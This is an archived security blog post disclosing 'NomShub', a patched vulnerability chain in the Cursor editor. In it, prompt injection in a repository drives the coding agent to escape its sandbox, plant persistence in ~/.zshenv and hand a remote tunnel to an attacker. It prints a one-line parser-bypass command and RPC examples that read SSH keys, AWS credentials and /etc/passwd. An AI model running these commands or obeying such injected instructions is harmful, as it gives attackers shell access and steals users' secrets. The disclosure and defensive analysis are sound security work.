---
source_url: http://www.straiker.ai/blog/nomshub-cursor-remote-tunneling-sandbox-breakout
ingested: 2026-06-09
sha256: 60971b14e9ceb432466f51e3fbe01ee3fbe935ee0fb3195e61cce5cda9c25173
type: article
author: Straiker (Sumit Agrawal, et al.)
title: "NomShub: Weaponizing Cursor's Remote Tunnel Through Indirect Prompt Injection and Sandbox Breakout"
created: 2026-06-09
tags: [agent-security, cursor, prompt-injection, sandbox-escape, lotl, dev-tunnels, vulnerability, supply-chain]
---

# NomShub: Weaponizing Cursor's Remote Tunnel Through Indirect Prompt Injection and Sandbox Breakout

> Source: http://www.straiker.ai/blog/nomshub-cursor-remote-tunneling-sandbox-breakout (Straiker, 2026-06-09)

## Key Takeaways

- **Indirect prompt injection in coding agents can escalate to full system compromise.** A malicious repository can trick Cursor's AI agent into installing a persistent backdoor.
- **Cursor's command sandbox is bypassable with a single line.** The IDE-level command parser (`shouldBlockShellCommand`) is blind to shell builtins like `export` and `cd`, allowing an attacker to escape the workspace scope and write to arbitrary locations in the user's home directory even with all protections enabled.
- **Cursor ships with a powerful remote tunnel feature** (`cursor-tunnel`) that provides full shell access to the host machine and can be weaponized through prompt injection.
- **This is a Living-Off-The-Land (LOTL) attack.** The cursor-tunnel binary is legitimately signed and notarized, evading antivirus and EDR detection.
- **Nation-state actors are already abusing this infrastructure.** Chinese APT group Stately Taurus has used VS Code tunnels for espionage operations against government targets.
- **Network detection is nearly impossible.** Traffic flows through Microsoft Azure infrastructure over standard HTTPS, appearing identical to legitimate developer activity.
- **Cursor runs without macOS sandbox restrictions**, granting attackers full filesystem access and command execution with user privileges.
- **AI agents will autonomously execute complex, multi-step attack chains** including sandbox escape, process termination, credential clearing, and command-and-control registration.

## Action Required

### For Cursor Users

- Be cautious when opening untrusted repositories in Cursor
- Review AI agent actions before approval, especially those involving cursor-tunnel or network requests
- Consider disabling or restricting the tunnel feature if not needed
- Monitor for unexpected cursor-tunnel processes
- Monitor sensitive dotfiles (`.zshenv`, `.bashrc`, `.zprofile`) for unauthorized modifications

### For Cursor/Anysphere

- Fix the command parser to recognize shell builtins (`export`, `cd`, `source`, etc.) as operations that affect security state
- Restrict the macOS seatbelt sandbox writable scope from ~/ to the workspace directory
- Implement explicit user confirmation before any tunnel-related operations
- Add guardrails preventing AI agents from executing tunnel setup commands
- Consider sandboxing or capability-limiting the AI agent's shell access
- Implement rate limiting and anomaly detection on tunnel registrations

## NomShub's Vulnerability Overview

In January 2026, we discovered a vulnerability chain affecting Cursor, the popular AI-powered code editor. By combining **indirect prompt injection** with a **sandbox escape** in Cursor's command parser and the editor's built-in **remote tunnel feature**, an attacker can achieve **persistent, authenticated shell access** to a victim's machine which is triggered simply by opening a malicious repository.

The attack exploits two distinct security failures:

1. **Sandbox Breakout**: Cursor's command parser (`shouldBlockShellCommand`) only tracks external executables, making it blind to shell builtins. A single command using export, cd, and echo bypasses all sandbox protections—escaping the workspace directory and writing to arbitrary locations under ~/.
2. **Tunnel Hijack**: Cursor ships with a fully functional cursor-tunnel binary that provides unauthenticated shell access via Microsoft's Dev Tunnels infrastructure. The AI agent can be instructed to start this tunnel and exfiltrate the authorization credentials to an attacker.

Combined, the attack requires no user interaction beyond opening the repository. The AI agent, upon encountering specially crafted content, autonomously:

1. Escapes the workspace sandbox using shell builtin chaining
2. Establishes persistence by writing to `~/.zshenv`
3. Terminates any existing tunnel processes
4. Clears cached GitHub credentials
5. Starts a fresh tunnel instance
6. Captures the GitHub device authorization code
7. Transmits the code to an attacker-controlled server
8. Registers the tunnel with the attacker's command-and-control infrastructure

Once complete, the attacker has full shell access to the victim's machine, running with the victim's user privileges and a persistence mechanism that survives tunnel restarts.

## Severity Classification

Under Microsoft's SDL Bug Bar criteria, NomShub qualifies as **Critical** severity. Cursor/Anysphere independently assessed the sandbox breakout component as **High** severity via HackerOne and awarded a bounty, with a fix confirmed for Cursor 3.0.

| Criterion | NomShub |
| --- | --- |
| Impact | Remote Code Execution (full shell access via `spawn` RPC) + persistent arbitrary code execution via `.zshenv` |
| User Interaction | Minimal, opening a repository is equivalent to "opening a file," which Microsoft explicitly classifies as _not extensive_ user interaction |
| Warnings/Prompts | None—sandbox bypass ensures no dialogs or confirmations before compromise |
| Attack Vector | Remote, attacker controls payload via malicious repository |

Microsoft's Bug Bar states: "When a vulnerability in one class can be combined with By-Design behavior to achieve higher class vulnerability, the vulnerability is rated at the higher class." The prompt injection alone might be of moderate severity, but combined with Cursor's built-in tunnel feature, it achieves unauthenticated Remote Code Execution which is the highest impact class.

## Disclosure Timeline

| Date | Event |
| --- | --- |
| Jan 16, 2026 | Vulnerability discovered |
| Feb 2, 2026 | Initial report submitted to Cursor |
| Apr 1, 2026 | Vendor acknowledgment |
| Apr 2, 2026 | Patch released 3.0 |
| Apr 3, 2026 | Public disclosure |

## Technical Deep Dive

### Part 1: The Sandbox Breakout

#### Cursor's Security Model

Cursor implements two defense layers for agent-executed shell commands:

**Layer 1: macOS Seatbelt Sandbox** — A kernel-level sandbox that restricts filesystem operations. This is the "hard" security boundary.

**Layer 2: IDE Command Parser (`shouldBlockShellCommand`)** — An application-level parser that inspects commands before execution to decide whether user approval is needed. This is the "soft" security boundary that gates YOLO mode auto-execution.

In theory, even with YOLO mode enabled, the command parser should block dangerous operations which include writing outside the workspace, modifying dotfiles, and executing untrusted binaries. In practice, the parser has a critical blind spot.

#### The Blind Spot: Shell Builtins

The command parser works by tracking **external executables** in a command string. It recognizes commands like `rm`, `cat`, `curl`, and `bash` and applies security rules accordingly. However, it is completely blind to **shell builtins**—commands that are executed by the shell itself rather than as separate processes.

The following builtins are invisible to the parser:
- `export` — Sets environment variables
- `cd` — Changes the working directory
- `source` — Executes a file in the current shell context
- `eval` — Executes arbitrary strings as commands

This means the parser cannot see when the working directory changes, when environment variables are manipulated, or when the shell's execution context is altered.

#### The One-Line Escape

By chaining an invisible builtin with a visible but benign executable, we bypass the parser entirely:

```
export CWD=~ && echo $CWD && cd $CWD && echo '/tmp/run.sh' > .zshenv
```

| What the parser sees | What actually happens |
| --- | --- |
| `export CWD=~` → invisible (builtin) | Sets `CWD` to the user's home directory |
| `echo $CWD` → benign (just prints text) | Prints the home path (harmless, but confirms variable is set) |
| `cd $CWD` → invisible (builtin) | **Changes working directory to ~/** — outside the workspace |
| `echo '/tmp/run.sh' > .zshenv` → benign (just writes text) | **Writes to ~/.zshenv** — a shell startup file that runs on every new terminal |

The parser sees `echo` commands—whitelisted as harmless. It cannot see that cd has moved the working directory from the workspace to the home directory, fundamentally changing what `.zshenv` resolves to.

#### Why the Seatbelt Sandbox Doesn't Help

The macOS seatbelt sandbox (Layer 1) should be the last line of defense. However, the sandbox's writable scope is configured to allow writes to the **entire home directory** (`~/`), not just the workspace. This means:
- The parser (Layer 2) is bypassed via builtin blindness
- The sandbox (Layer 1) permits the write because ~/ is in scope

Both layers fail simultaneously, producing a **deterministic, 100% reliable sandbox escape** with zero dependencies—no race conditions, no symlinks, no timing attacks.

#### Persistence via `.zshenv`

The target file, `~/.zshenv`, is particularly dangerous because it is executed by **every new Zsh shell instance**—interactive, non-interactive, login, and non-login shells alike. This means:
- Every new Terminal window runs the attacker's payload
- Every shell spawned by other applications runs the payload
- Scripts that invoke `/bin/zsh` run the payload
- The Cursor terminal itself runs the payload on next launch

In our attack chain, `.zshenv` is overwritten with `/tmp/run.sh`, pointing to a script that the AI agent has already been instructed to create containing the full tunnel setup and C2 registration logic. This bridges the sandbox escape to the tunnel exploitation—the prompt injection creates the attack script, the `.zshenv` write ensures it executes automatically, and the tunnel provides persistent remote access.

### Part 2: The Tunnel Exploitation

#### Why Cursor Has `cursor-tunnel`

Cursor ships with a `cursor-tunnel` binary that wraps Microsoft's Dev Tunnels service. Dev Tunnels is a legitimate Microsoft Azure service that allows developers to expose local services through secure tunnels for testing webhooks, mobile apps, and remote development. The tunnel is authenticated via GitHub's device flow, where the user approves access once via a browser.

#### The Attack: Weaponizing the Tunnel

Once the sandbox is escaped and persistence is established, the AI agent executes the following chain:

1. **Terminate existing tunnels**: Kill any running cursor-tunnel processes to clear the slate
2. **Clear cached credentials**: Remove GitHub auth tokens to force re-authentication
3. **Start a new tunnel**: Execute `cursor-tunnel` to spin up a fresh Dev Tunnel
4. **Capture the device code**: The tunnel process outputs a device code URL (e.g. `https://github.com/login/device`) and a one-time user code
5. **Exfiltrate the code**: Send the device code to an attacker-controlled endpoint
6. **Attacker authorizes**: The attacker visits the URL, enters the code, and authorizes the tunnel
7. **C2 registration**: The tunnel registers with Microsoft's Dev Tunnels infrastructure, pointing to the victim's local SSH service
8. **Persistent shell**: The attacker now has authenticated shell access via `ssh -p {tunnel_port} tunnel@{cluster}.devtunnels.ms`

The tunnel runs with **the user's full privileges**, not the agent's sandboxed privileges, because it executes in the user's shell environment after the sandbox escape.

### Why This Is Living-Off-The-Land (LOTL)

The cursor-tunnel binary is:
- **Signed by Microsoft**: The legitimate Dev Tunnels client, signed and notarized by Apple
- **Hosted on Azure infrastructure**: Traffic flows through `*.tunnels.api.visualstudio.com` over standard HTTPS
- **Indistinguishable from normal development**: Developers legitimately use Dev Tunnels for testing webhooks and remote development

This means:
- **Antivirus/EDR sees a legitimate Microsoft binary** and does not flag it
- **Network monitoring sees HTTPS to Azure** and cannot distinguish it from legitimate tunnel usage
- **The attack chain uses only built-in features**—no malware, no exploit code, no C2 infrastructure (other than the standard Dev Tunnels relay)

### Nation-State Precedent: Stately Taurus / VSCode Tunnels

The same attack pattern was observed in the wild by Stately Taurus (a Chinese APT group) against government targets in Southeast Asia. Unit 42 documented the campaign in their report on VSCode tunnel abuse. The fact that a nation-state actor is already using this exact technique validates the NomShub threat model.

### Full System Access Without Sandbox

Once connected, the attacker has unrestricted access to the victim's machine:

```
# Command Execution
{"method": "spawn", "params": {"command": "/bin/bash", "args": ["-c", "cat /etc/passwd"]}}

# File System Traversal
{"method": "fs_readdir", "params": {"path": "/"}}
{"method": "fs_read", "params": {"path": "/Users/victim/.ssh/id_rsa"}}
{"method": "fs_read", "params": {"path": "/Users/victim/.aws/credentials"}}

# Environment Variable Harvesting
{"method": "get_env", "params": {}}
# Returns: API keys, tokens, paths, database URLs...
```

**Cursor runs without macOS sandbox restrictions.** Unlike apps distributed through the Mac App Store, Cursor:
- Is not confined by App Sandbox
- Has full filesystem access (limited only by user permissions)
- Can execute arbitrary binaries
- Can access keychain items (with user approval)
- Can read/write to any user-accessible location

This means the cursor-tunnel process (by extension, any attacker connected through it) operates with the full privileges of the logged-in user. There is no containment layer between the tunnel and the rest of the system.

## Combined Risk Profile

| Risk Factor | Impact |
| --- | --- |
| LOTL (Signed Binary) | Evades endpoint detection |
| APT Precedent | Proven effective in nation-state operations |
| Azure Infrastructure | Evades network detection |
| Full RPC Access | Complete system compromise |
| No macOS Sandbox | No containment or privilege reduction |
| AI-Triggered | No user interaction required beyond opening repo |

This combination makes NomShub an ideal initial access vector: difficult to detect, difficult to block, and providing complete access once successful.

## Why This Matters: AI Agents as Attack Amplifiers

This vulnerability exemplifies a new class of security issues emerging with agentic AI systems. Traditional prompt injection might trick an AI into saying something inappropriate or revealing system prompts. **Agentic prompt injection can compromise entire systems.**

### Traditional Vulnerability vs. AI-Amplified Vulnerability

| Aspect | Traditional Vuln | NomShub |
| --- | --- | --- |
| Initial vector | Code execution bug | Prompt injection |
| Attacker effort | Write exploit code | Craft malicious content |
| Attack complexity | Multi-step manual exploitation | AI executes entire chain autonomously |
| Required knowledge | Deep technical expertise | Understanding of AI behavior |
| Persistence | Often requires additional steps | Built into the attack chain (`.zshenv` + tunnel) |

### The Amplification Effect

The prompt injection itself is relatively simple malicious instructions embedded in repository content. But the AI agent amplifies this into a sophisticated attack:
1. Sandbox escape (builtin chaining to break workspace confinement)
2. Persistence installation (`.zshenv` overwrite)
3. Process management (killing existing tunnels)
4. Credential manipulation (clearing cached auth)
5. Service orchestration (starting new tunnel)
6. Data exfiltration (capturing device codes)
7. C2 communication (registering with attacker infrastructure)

A human attacker would need to chain together multiple exploits and maintain persistent access. **The AI agent does this autonomously, following the injected instructions as if they were legitimate development tasks.**

### The Collapsed Security Boundary

Coding agents are designed to help developers by reading and understanding code, running builds and tests, executing shell commands, and managing files and configurations. These capabilities are features, not bugs. But they create an environment where **the distinction between "read" and "execute" disappears**. An agent processing a malicious repository isn't just reading dangerous content, it's potentially executing it.

The sandbox escape compounds this problem. Even when Cursor attempts to constrain the agent's capabilities through its command parser, the parser's architectural blind spot (inability to track builtins) means the constraints are illusory. The agent believes it's operating within a sandbox; the attacker knows it isn't.

## Recommendations

### For AI Coding Assistant Developers

1. **Fix the command parser to track shell builtins.** The parser must recognize that `export, cd, source`, and `eval` can fundamentally alter the security context of subsequent commands.
2. **Restrict sandbox writable scope.** The macOS seatbelt sandbox should limit writes to the workspace directory, not the entire home directory.
3. **Implement explicit confirmation for sensitive operations.** Tunnel setup, credential operations, and network requests to unknown domains should require user approval.
4. **Create capability boundaries.** Consider preventing AI agents from executing tunnel-related commands entirely, or requiring elevated permissions.
5. **Add injection-resistant guardrails.** Implement detection for common prompt injection patterns, especially those targeting system operations.
6. **Sandbox agent execution.** Limit the blast radius of successful prompt injections by constraining what the agent can access.
7. **Log and audit agent actions.** Maintain detailed logs of agent operations to enable detection of compromise.

## Appendix A: Protocol Technical Details (Microsoft Dev Tunnels)

### SSH Key Exchange

| Algorithm Type | Value |
| --- | --- |
| KEX | diffie-hellman-group14-sha256 |
| Host Key | rsa-sha2-512 |
| Encryption | aes256-ctr |
| MAC | hmac-sha2-512-etm@openssh.com |
| Compression | none |

### WebSocket Connection

URL format: `wss://{CLUSTER}-data.rel.tunnels.api.visualstudio.com/api/v1/Client/Connect/{TUNNEL_ID}`

JWT token is passed as a WebSocket subprotocol:
```
subprotocols = [
  'tunnel-relay-client-v2-dev',
  'tunnel-relay-client',
  JWT_TOKEN  # The actual token as third subprotocol
]
```

### MsgPack RPC Message Format

Request: `{"id": 1, "method": "method_name", "params": {...}}`
Response: `{"id": 1, "result": {...}}`
Notification (no response expected): `{"id": null, "method": "event_name", "params": {...}}`

## Appendix B: Verified Affected Systems

- **Cursor (macOS)** — cursor-tunnel binary
- **VS Code (macOS)** — code-tunnel binary

Both use identical underlying protocols (Microsoft Dev Tunnels) and are likely affected by similar attack patterns.

---

**Key takeaways:**

1. **Shell builtin blindness is a fundamental parser-level flaw** — `export`, `cd`, `source`, `eval` alter security context but are invisible to executables-only parsers. Any IDE/agent command parser must be re-engineered to track shell state
2. **Layered defense failed not because layers were weak but because scope was wrong** — seatbelt sandbox allowed `~/` writes, parser only tracked executables. **Defense-in-depth requires all layers to actually constrain the threat**
3. **LOTL tunnel features are the AI-era equivalent of `powershell.exe -enc`** — signed, legitimate, Azure-routed, network-undetectable. Dev Tunnels + AI agent = "self-installing backdoor with revocation resistance"
4. **AI agents collapse the attacker-effort curve** — NomShub is essentially a single prompt injection; the agent does the rest. A human attacker would need exploit chain + persistence + C2 setup; the agent executes all 7 steps autonomously
5. **`.zshenv` is the perfect persistence target on macOS** — every new shell (interactive, script, app-launched) re-executes it. Equivalent on Linux: `~/.bashrc`; on Windows: `HKCU\...\Run` registry keys
6. **Nation-state APT (Stately Taurus) already weaponized VS Code tunnels** — this is not theoretical; the technique has been observed in espionage operations against government targets
